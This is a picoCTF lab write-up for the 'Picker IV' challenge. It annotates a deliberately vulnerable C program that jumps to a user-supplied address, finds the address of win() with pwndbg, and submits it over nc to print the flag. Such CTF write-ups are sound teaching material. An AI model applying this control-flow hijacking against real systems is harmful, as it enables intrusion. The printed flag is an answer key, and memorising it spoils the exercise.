# Picker IV
This was a challenge listed exclusively for the Pico Gym.  It's listed as Medium and categorized as a Binary Exploitation challenge.  
Direct Link:  https://play.picoctf.org/practice/challenge/403

## Description
The Description reads:
> Can you figure out how this program works to get the flag?

## Hints
There are two hints:
> With Python, there are no binaries. With compiled languages like C, there is source code, and there are binaries. Binaries are created from source code, they are a conversion from the human-readable source code, to the highly efficient machine language, in this case: x86_64.
> How can you find the address that win is at?

# Solving
## My Thoughts
This is a nice intro to debugging C programs and removes a lot of the security features that increase the difficulty of it exponentially.

## Source Code
This looks to be a standard C binary exploitation challenge.  The flag is in the win function and we need to manipulate the program to point to that function.

So let's start by looking at the source code, I've added comments to explain what's going on:

``` c
// These are all calls to include extra functions for use in the program.
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

// A function that will be called if a segfault occurs.
void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

// A function that can be called to get the flag.
int win() {
  // Initiates a file pointer.
  FILE *fptr;
  // Initiates a variable named c that will hold a character.
  char c;

  printf("You won!\n");
  // Opens the flag file
  fptr = fopen("flag.txt", "r");
  // This just makes sure that the file actually exists.
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Reads the first character from the file
  c = fgetc(fptr);
  // Prints the contents of the file then reads in the next character
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  // Prints a new line
  printf("\n");
  // Closes the file
  fclose(fptr);
}

// Called when the program starts.
int main() {
  // No clue what this does
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  // Initiates a variable named val that holds an unsigned integer, unsigned means it can't represent negative numbers.
  unsigned int val;
  // Asks the user to enter some data
  printf("Enter the address in hex to jump to, excluding '0x': ");
  // Reads in the user's data.  %x means that what the user enters has to be hex data.
  // The user's data is then saved in the val variable created above.
  scanf("%x", &val);
  // Prints the user's input.
  printf("You input 0x%x\n", val);

  // Creates a function named foo that points to the memory address specified by the user using the variable val that was set above.
  void (*foo)(void) = (void (*)())val;
  // Calls the new function.
  foo();
}
```

If your at all familiar with C vulnerabilities, this will look pretty familiar.  The difference here is that the printf function is actually implemented correctly!  

Printf is inherently vulnerable because it will interpret string format characters such as %p, this can allow us to read through the stack and get memory locations.  

With the correctly typed scanf and printf functions, the only thing we can enter without crashing the program is valid hex data as shown below:

``` bash
┌──(kali㉿kali)-[~/picoctf/gym/Picker_IV]
└─$ ./picker-IV
Enter the address in hex to jump to, excluding '0x': %p
You input 0x0
Segfault triggered! Exiting.
```

Ok, let's take a step back then.

## GDB
Let's run the 'file' command on the executable really quickly to see what we're dealing with:

``` bash
┌──(noah㉿kali)-[~/picoctf/gym/Picker_IV]
└─$ file picker-IV
picker-IV: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=12b33c5ff389187551aae5774324da558cee006c, for GNU/Linux 3.2.0, not stripped
```

This gives us some info about the executable.  It's 64-bit but really doesn't seem to have any other problematic security features (memory randomization/PIE) enabled.

Let's verify that with pwntools' [checksec tool](https://docs.pwntools.com/en/dev/commandline.html):

``` bash
┌──(kali㉿kali)-[~/picoctf/gym/Picker_IV]
└─$ checksec picker-IV
[*] '/home/noah/picoctf/gym/Picker_IV/picker-IV'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Yup, looks promising! Since there are no security features enabled, we can actually just run the program in gdb and get the memory addresses we need to get our flag!

gdb stands for Gnu Debugger and is a legitimate tool used to debug executable programs.  We're going to use it (combined with the [pwndbg addon](https://github.com/pwndbg/pwndbg) to compromise this progrm and get our flag:

Let's start by just running the program with pwndbg:

``` bash
┌──(kali㉿kali)-[~/picoctf/gym/Picker_IV]
└─$ pwndbg picker-IV

Reading symbols from picker-IV...
(No debugging symbols found in picker-IV)
pwndbg: loaded 187 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $argv, $envp, $argc, $environ, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
GDB's set directories <path> parameter can be used to debug e.g. glibc sources like the malloc/free functions!
pwndbg>
```

Lots of stuff there, can be a little overwhelming.  First off, we can simply run the program using the "run" command:

``` bash
pwndbg> run
Starting program: /home/kali/picoctf/gym/Picker_IV/picker-IV
warning: could not convert 'rb_root' from the host encoding (UTF-8) to UTF-32.
This normally should not happen, please file a bug report.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the address in hex to jump to, excluding '0x':
```

Now let's get the memory addresses of the various functions:

``` bash
pwndbg> print main
$1 = {<text variable, no debug info>} 0x401334 <main>
pwndbg> print win
$2 = {<text variable, no debug info>} 0x40129e <win>
```

Ok, so the memory location of win is 0x40129e!  Let's try connecting to the server and send that over to see if we get the flag:

``` bash
┌──(noah㉿kali)-[~/picoctf/gym/Picker_IV]
└─$ nc saturn.picoctf.net 59365
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}
```

Awesome, we got the flag!
